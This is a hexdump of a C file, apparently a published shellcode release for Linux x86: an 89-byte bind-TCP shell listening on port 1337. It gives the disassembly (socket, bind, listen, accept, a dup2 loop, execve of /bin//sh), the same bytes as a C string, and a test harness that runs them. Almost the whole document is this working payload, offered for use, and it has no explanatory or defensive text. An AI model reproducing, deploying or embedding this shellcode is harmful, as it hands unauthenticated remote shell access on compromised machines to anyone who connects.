00000000  2f 2a 20 0a 2a 20 20 54  69 74 6c 65 3a 20 20 20  |/* .*  Title:   |
00000010  20 53 68 65 6c 6c 20 42  69 6e 64 20 54 43 50 20  | Shell Bind TCP |
00000020  53 68 65 6c 6c 63 6f 64  65 20 50 6f 72 74 20 31  |Shellcode Port 1|
00000030  33 33 37 20 2d 20 38 39  20 62 79 74 65 73 0a 2a  |337 - 89 bytes.*|
00000040  20 20 50 6c 61 74 66 6f  72 6d 3a 20 4c 69 6e 75  |  Platform: Linu|
00000050  78 2f 78 38 36 0a 2a 20  20 44 61 74 65 3a 20 20  |x/x86.*  Date:  |
00000060  20 20 20 32 30 31 34 2d  30 37 2d 31 33 0a 2a 20  |   2014-07-13.* |
00000070  20 41 75 74 68 6f 72 3a  20 20 20 4a 75 6c 69 65  | Author:   Julie|
00000080  6e 20 41 68 72 65 6e 73  20 28 40 4d 72 54 75 78  |n Ahrens (@MrTux|
00000090  72 61 63 65 72 29 0a 2a  20 20 57 65 62 73 69 74  |racer).*  Websit|
000000a0  65 3a 20 20 68 74 74 70  3a 2f 2f 77 77 77 2e 72  |e:  http://www.r|
000000b0  63 65 73 65 63 75 72 69  74 79 2e 63 6f 6d 20 0a  |cesecurity.com .|
000000c0  2a 0a 2a 20 20 44 69 73  61 73 73 65 6d 62 6c 79  |*.*  Disassembly|
000000d0  20 6f 66 20 73 65 63 74  69 6f 6e 20 2e 74 65 78  | of section .tex|
000000e0  74 3a 0a 2a 20 20 30 30  30 30 30 30 30 30 20 3c  |t:.*  00000000 <|
000000f0  5f 73 74 61 72 74 3e 3a  0a 2a 20 20 30 3a 20 20  |_start>:.*  0:  |
00000100  20 36 61 20 36 36 20 20  20 20 20 20 20 20 20 20  | 6a 66          |
00000110  20 20 20 20 20 20 70 75  73 68 20 20 20 30 78 36  |      push   0x6|
00000120  36 0a 2a 20 20 32 3a 20  20 20 35 38 20 20 20 20  |6.*  2:   58    |
00000130  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000140  6f 70 20 20 20 20 65 61  78 0a 2a 20 20 33 3a 20  |op    eax.*  3: |
00000150  20 20 36 61 20 30 31 20  20 20 20 20 20 20 20 20  |  6a 01         |
00000160  20 20 20 20 20 20 20 70  75 73 68 20 20 20 30 78  |       push   0x|
00000170  31 0a 2a 20 20 35 3a 20  20 20 35 62 20 20 20 20  |1.*  5:   5b    |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000190  6f 70 20 20 20 20 65 62  78 0a 2a 20 20 36 3a 20  |op    ebx.*  6: |
000001a0  20 20 33 31 20 66 36 20  20 20 20 20 20 20 20 20  |  31 f6         |
000001b0  20 20 20 20 20 20 20 78  6f 72 20 20 20 20 65 73  |       xor    es|
000001c0  69 2c 65 73 69 0a 2a 20  20 38 3a 20 20 20 35 36  |i,esi.*  8:   56|
000001d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001e0  20 20 20 70 75 73 68 20  20 20 65 73 69 0a 2a 20  |   push   esi.* |
000001f0  20 39 3a 20 20 20 35 33  20 20 20 20 20 20 20 20  | 9:   53        |
00000200  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
00000210  20 20 65 62 78 0a 2a 20  20 61 3a 20 20 20 36 61  |  ebx.*  a:   6a|
00000220  20 30 32 20 20 20 20 20  20 20 20 20 20 20 20 20  | 02             |
00000230  20 20 20 70 75 73 68 20  20 20 30 78 32 0a 2a 20  |   push   0x2.* |
00000240  20 63 3a 20 20 20 38 39  20 65 31 20 20 20 20 20  | c:   89 e1     |
00000250  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
00000260  20 20 65 63 78 2c 65 73  70 0a 2a 20 20 65 3a 20  |  ecx,esp.*  e: |
00000270  20 20 63 64 20 38 30 20  20 20 20 20 20 20 20 20  |  cd 80         |
00000280  20 20 20 20 20 20 20 69  6e 74 20 20 20 20 30 78  |       int    0x|
00000290  38 30 0a 2a 20 31 30 3a  20 20 20 35 66 20 20 20  |80.* 10:   5f   |
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002b0  70 6f 70 20 20 20 20 65  64 69 0a 2a 20 31 31 3a  |pop    edi.* 11:|
000002c0  20 20 20 39 37 20 20 20  20 20 20 20 20 20 20 20  |   97           |
000002d0  20 20 20 20 20 20 20 20  78 63 68 67 20 20 20 65  |        xchg   e|
000002e0  64 69 2c 65 61 78 0a 2a  20 31 32 3a 20 20 20 39  |di,eax.* 12:   9|
000002f0  33 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3               |
00000300  20 20 20 20 78 63 68 67  20 20 20 65 62 78 2c 65  |    xchg   ebx,e|
00000310  61 78 0a 2a 20 31 33 3a  20 20 20 62 30 20 36 36  |ax.* 13:   b0 66|
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000330  6d 6f 76 20 20 20 20 61  6c 2c 30 78 36 36 0a 2a  |mov    al,0x66.*|
00000340  20 31 35 3a 20 20 20 35  36 20 20 20 20 20 20 20  | 15:   56       |
00000350  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
00000360  20 20 20 65 73 69 0a 2a  20 31 36 3a 20 20 20 36  |   esi.* 16:   6|
00000370  36 20 36 38 20 30 35 20  33 39 20 20 20 20 20 20  |6 68 05 39      |
00000380  20 20 20 20 70 75 73 68  77 20 20 30 78 33 39 30  |    pushw  0x390|
00000390  35 0a 2a 20 31 61 3a 20  20 20 36 36 20 35 33 20  |5.* 1a:   66 53 |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
000003b0  75 73 68 20 20 20 62 78  0a 2a 20 31 63 3a 20 20  |ush   bx.* 1c:  |
000003c0  20 38 39 20 65 31 20 20  20 20 20 20 20 20 20 20  | 89 e1          |
000003d0  20 20 20 20 20 20 6d 6f  76 20 20 20 20 65 63 78  |      mov    ecx|
000003e0  2c 65 73 70 0a 2a 20 31  65 3a 20 20 20 36 61 20  |,esp.* 1e:   6a |
000003f0  31 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |10              |
00000400  20 20 70 75 73 68 20 20  20 30 78 31 30 0a 2a 20  |  push   0x10.* |
00000410  32 30 3a 20 20 20 35 31  20 20 20 20 20 20 20 20  |20:   51        |
00000420  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
00000430  20 20 65 63 78 0a 2a 20  32 31 3a 20 20 20 35 37  |  ecx.* 21:   57|
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000450  20 20 20 70 75 73 68 20  20 20 65 64 69 0a 2a 20  |   push   edi.* |
00000460  32 32 3a 20 20 20 38 39  20 65 31 20 20 20 20 20  |22:   89 e1     |
00000470  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
00000480  20 20 65 63 78 2c 65 73  70 0a 2a 20 32 34 3a 20  |  ecx,esp.* 24: |
00000490  20 20 63 64 20 38 30 20  20 20 20 20 20 20 20 20  |  cd 80         |
000004a0  20 20 20 20 20 20 20 69  6e 74 20 20 20 20 30 78  |       int    0x|
000004b0  38 30 0a 2a 20 32 36 3a  20 20 20 62 30 20 36 36  |80.* 26:   b0 66|
000004c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004d0  6d 6f 76 20 20 20 20 61  6c 2c 30 78 36 36 0a 2a  |mov    al,0x66.*|
000004e0  20 32 38 3a 20 20 20 62  33 20 30 34 20 20 20 20  | 28:   b3 04    |
000004f0  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00000500  20 20 20 62 6c 2c 30 78  34 0a 2a 20 32 61 3a 20  |   bl,0x4.* 2a: |
00000510  20 20 35 36 20 20 20 20  20 20 20 20 20 20 20 20  |  56            |
00000520  20 20 20 20 20 20 20 70  75 73 68 20 20 20 65 73  |       push   es|
00000530  69 0a 2a 20 32 62 3a 20  20 20 35 37 20 20 20 20  |i.* 2b:   57    |
00000540  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000550  75 73 68 20 20 20 65 64  69 0a 2a 20 32 63 3a 20  |ush   edi.* 2c: |
00000560  20 20 38 39 20 65 31 20  20 20 20 20 20 20 20 20  |  89 e1         |
00000570  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 65 63  |       mov    ec|
00000580  78 2c 65 73 70 0a 2a 20  32 65 3a 20 20 20 63 64  |x,esp.* 2e:   cd|
00000590  20 38 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 80             |
000005a0  20 20 20 69 6e 74 20 20  20 20 30 78 38 30 0a 2a  |   int    0x80.*|
000005b0  20 33 30 3a 20 20 20 62  30 20 36 36 20 20 20 20  | 30:   b0 66    |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
000005d0  20 20 20 61 6c 2c 30 78  36 36 0a 2a 20 33 32 3a  |   al,0x66.* 32:|
000005e0  20 20 20 34 33 20 20 20  20 20 20 20 20 20 20 20  |   43           |
000005f0  20 20 20 20 20 20 20 20  69 6e 63 20 20 20 20 65  |        inc    e|
00000600  62 78 0a 2a 20 33 33 3a  20 20 20 35 36 20 20 20  |bx.* 33:   56   |
00000610  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000620  70 75 73 68 20 20 20 65  73 69 0a 2a 20 33 34 3a  |push   esi.* 34:|
00000630  20 20 20 35 36 20 20 20  20 20 20 20 20 20 20 20  |   56           |
00000640  20 20 20 20 20 20 20 20  70 75 73 68 20 20 20 65  |        push   e|
00000650  73 69 0a 2a 20 33 35 3a  20 20 20 35 37 20 20 20  |si.* 35:   57   |
00000660  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000670  70 75 73 68 20 20 20 65  64 69 0a 2a 20 33 36 3a  |push   edi.* 36:|
00000680  20 20 20 38 39 20 65 31  20 20 20 20 20 20 20 20  |   89 e1        |
00000690  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 65  |        mov    e|
000006a0  63 78 2c 65 73 70 0a 2a  20 33 38 3a 20 20 20 63  |cx,esp.* 38:   c|
000006b0  64 20 38 30 20 20 20 20  20 20 20 20 20 20 20 20  |d 80            |
000006c0  20 20 20 20 69 6e 74 20  20 20 20 30 78 38 30 0a  |    int    0x80.|
000006d0  2a 20 33 61 3a 20 20 20  35 39 20 20 20 20 20 20  |* 3a:   59      |
000006e0  20 20 20 20 20 20 20 20  20 20 20 20 20 70 6f 70  |             pop|
000006f0  20 20 20 20 65 63 78 0a  2a 20 33 62 3a 20 20 20  |    ecx.* 3b:   |
00000700  35 39 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |59              |
00000710  20 20 20 20 20 70 6f 70  20 20 20 20 65 63 78 0a  |     pop    ecx.|
00000720  2a 20 33 63 3a 20 20 20  62 31 20 30 32 20 20 20  |* 3c:   b1 02   |
00000730  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00000740  20 20 20 20 63 6c 2c 30  78 32 0a 2a 20 33 65 3a  |    cl,0x2.* 3e:|
00000750  20 20 20 39 33 20 20 20  20 20 20 20 20 20 20 20  |   93           |
00000760  20 20 20 20 20 20 20 20  78 63 68 67 20 20 20 65  |        xchg   e|
00000770  62 78 2c 65 61 78 0a 2a  0a 2a 20 30 30 30 30 30  |bx,eax.*.* 00000|
00000780  30 33 66 20 3c 6c 6f 6f  70 3e 3a 0a 2a 20 33 66  |03f <loop>:.* 3f|
00000790  3a 20 20 20 62 30 20 33  66 20 20 20 20 20 20 20  |:   b0 3f       |
000007a0  20 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |         mov    |
000007b0  61 6c 2c 30 78 33 66 0a  2a 20 34 31 3a 20 20 20  |al,0x3f.* 41:   |
000007c0  63 64 20 38 30 20 20 20  20 20 20 20 20 20 20 20  |cd 80           |
000007d0  20 20 20 20 20 69 6e 74  20 20 20 20 30 78 38 30  |     int    0x80|
000007e0  0a 2a 20 34 33 3a 20 20  20 34 39 20 20 20 20 20  |.* 43:   49     |
000007f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 64 65  |              de|
00000800  63 20 20 20 20 65 63 78  0a 2a 20 34 34 3a 20 20  |c    ecx.* 44:  |
00000810  20 37 39 20 66 39 20 20  20 20 20 20 20 20 20 20  | 79 f9          |
00000820  20 20 20 20 20 20 6a 6e  73 20 20 20 20 33 66 20  |      jns    3f |
00000830  3c 6c 6f 6f 70 3e 0a 2a  20 34 36 3a 20 20 20 62  |<loop>.* 46:   b|
00000840  30 20 30 62 20 20 20 20  20 20 20 20 20 20 20 20  |0 0b            |
00000850  20 20 20 20 6d 6f 76 20  20 20 20 61 6c 2c 30 78  |    mov    al,0x|
00000860  62 0a 2a 20 34 38 3a 20  20 20 36 38 20 32 66 20  |b.* 48:   68 2f |
00000870  32 66 20 37 33 20 36 38  20 20 20 20 20 20 20 70  |2f 73 68       p|
00000880  75 73 68 20 20 20 30 78  36 38 37 33 32 66 32 66  |ush   0x68732f2f|
00000890  0a 2a 20 34 64 3a 20 20  20 36 38 20 32 66 20 36  |.* 4d:   68 2f 6|
000008a0  32 20 36 39 20 36 65 20  20 20 20 20 20 20 70 75  |2 69 6e       pu|
000008b0  73 68 20 20 20 30 78 36  65 36 39 36 32 32 66 0a  |sh   0x6e69622f.|
000008c0  2a 20 35 32 3a 20 20 20  38 39 20 65 33 20 20 20  |* 52:   89 e3   |
000008d0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
000008e0  20 20 20 20 65 62 78 2c  65 73 70 0a 2a 20 35 34  |    ebx,esp.* 54|
000008f0  3a 20 20 20 34 31 20 20  20 20 20 20 20 20 20 20  |:   41          |
00000900  20 20 20 20 20 20 20 20  20 69 6e 63 20 20 20 20  |         inc    |
00000910  65 63 78 0a 2a 20 35 35  3a 20 20 20 38 39 20 63  |ecx.* 55:   89 c|
00000920  61 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |a               |
00000930  20 6d 6f 76 20 20 20 20  65 64 78 2c 65 63 78 0a  | mov    edx,ecx.|
00000940  2a 20 35 37 3a 20 20 20  63 64 20 38 30 20 20 20  |* 57:   cd 80   |
00000950  20 20 20 20 20 20 20 20  20 20 20 20 20 69 6e 74  |             int|
00000960  20 20 20 20 30 78 38 30  0a 2a 2f 0a 0a 23 69 6e  |    0x80.*/..#in|
00000970  63 6c 75 64 65 20 3c 73  74 64 69 6f 2e 68 3e 0a  |clude <stdio.h>.|
00000980  0a 75 6e 73 69 67 6e 65  64 20 63 68 61 72 20 73  |.unsigned char s|
00000990  68 65 6c 6c 63 6f 64 65  5b 5d 20 3d 20 5c 0a 22  |hellcode[] = \."|
000009a0  5c 78 36 61 5c 78 36 36  5c 78 35 38 5c 78 36 61  |\x6a\x66\x58\x6a|
000009b0  5c 78 30 31 5c 78 35 62  5c 78 33 31 5c 78 66 36  |\x01\x5b\x31\xf6|
000009c0  5c 78 35 36 5c 78 35 33  5c 78 36 61 5c 78 30 32  |\x56\x53\x6a\x02|
000009d0  5c 78 38 39 5c 78 65 31  5c 78 63 64 5c 78 38 30  |\x89\xe1\xcd\x80|
000009e0  5c 78 35 66 5c 78 39 37  5c 78 39 33 5c 78 62 30  |\x5f\x97\x93\xb0|
000009f0  5c 78 36 36 5c 78 35 36  5c 78 36 36 5c 78 36 38  |\x66\x56\x66\x68|
00000a00  5c 78 30 35 5c 78 33 39  5c 78 36 36 5c 78 35 33  |\x05\x39\x66\x53|
00000a10  5c 78 38 39 5c 78 65 31  5c 78 36 61 5c 78 31 30  |\x89\xe1\x6a\x10|
00000a20  5c 78 35 31 5c 78 35 37  5c 78 38 39 5c 78 65 31  |\x51\x57\x89\xe1|
00000a30  5c 78 63 64 5c 78 38 30  5c 78 62 30 5c 78 36 36  |\xcd\x80\xb0\x66|
00000a40  5c 78 62 33 5c 78 30 34  5c 78 35 36 5c 78 35 37  |\xb3\x04\x56\x57|
00000a50  5c 78 38 39 5c 78 65 31  5c 78 63 64 5c 78 38 30  |\x89\xe1\xcd\x80|
00000a60  5c 78 62 30 5c 78 36 36  5c 78 34 33 5c 78 35 36  |\xb0\x66\x43\x56|
00000a70  5c 78 35 36 5c 78 35 37  5c 78 38 39 5c 78 65 31  |\x56\x57\x89\xe1|
00000a80  5c 78 63 64 5c 78 38 30  5c 78 35 39 5c 78 35 39  |\xcd\x80\x59\x59|
00000a90  5c 78 62 31 5c 78 30 32  5c 78 39 33 5c 78 62 30  |\xb1\x02\x93\xb0|
00000aa0  5c 78 33 66 5c 78 63 64  5c 78 38 30 5c 78 34 39  |\x3f\xcd\x80\x49|
00000ab0  5c 78 37 39 5c 78 66 39  5c 78 62 30 5c 78 30 62  |\x79\xf9\xb0\x0b|
00000ac0  5c 78 36 38 5c 78 32 66  5c 78 32 66 5c 78 37 33  |\x68\x2f\x2f\x73|
00000ad0  5c 78 36 38 5c 78 36 38  5c 78 32 66 5c 78 36 32  |\x68\x68\x2f\x62|
00000ae0  5c 78 36 39 5c 78 36 65  5c 78 38 39 5c 78 65 33  |\x69\x6e\x89\xe3|
00000af0  5c 78 34 31 5c 78 38 39  5c 78 63 61 5c 78 63 64  |\x41\x89\xca\xcd|
00000b00  5c 78 38 30 22 3b 0a 0a  6d 61 69 6e 28 29 0a 7b  |\x80";..main().{|
00000b10  0a 70 72 69 6e 74 66 28  22 53 68 65 6c 6c 63 6f  |.printf("Shellco|
00000b20  64 65 20 4c 65 6e 67 74  68 3a 20 20 25 64 5c 6e  |de Length:  %d\n|
00000b30  22 2c 20 73 69 7a 65 6f  66 28 73 68 65 6c 6c 63  |", sizeof(shellc|
00000b40  6f 64 65 29 20 2d 20 31  29 3b 0a 69 6e 74 20 28  |ode) - 1);.int (|
00000b50  2a 72 65 74 29 28 29 20  3d 20 28 69 6e 74 28 2a  |*ret)() = (int(*|
00000b60  29 28 29 29 73 68 65 6c  6c 63 6f 64 65 3b 0a 72  |)())shellcode;.r|
00000b70  65 74 28 29 3b 0a 7d                              |et();.}|
00000b77
